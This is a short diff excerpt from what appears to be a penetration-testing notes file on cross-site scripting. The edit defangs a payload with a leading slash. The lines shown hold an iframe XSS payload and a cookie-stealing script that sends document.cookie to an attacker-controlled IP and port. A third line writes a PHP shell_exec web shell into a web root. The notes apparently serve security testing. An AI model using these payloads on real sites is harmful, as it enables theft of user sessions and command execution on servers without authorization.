@@ -60,7 +60,7 @@ To test JS XSS vulnerability (the leading / are to prevent execution on github)
 - </iframe SRC="(use your IP):(Port to listen on) /report" height="0" width="0"></iframe></script>alert("XSS through Javascript, success");</script>
 
 Cookie Stealing Inject  
-- <script>new Image().src="http://(use your IP):81 /bogus.php?output="+document.cookie;</script>
+- </script>new Image().src="http://(use your IP):81 /bogus.php?output="+document.cookie;</script>
 
 Malicious php code to host on local box  
 - echo '<?php echo shell_exec("ipconfig");?>' > /var/www/html/evil.txt
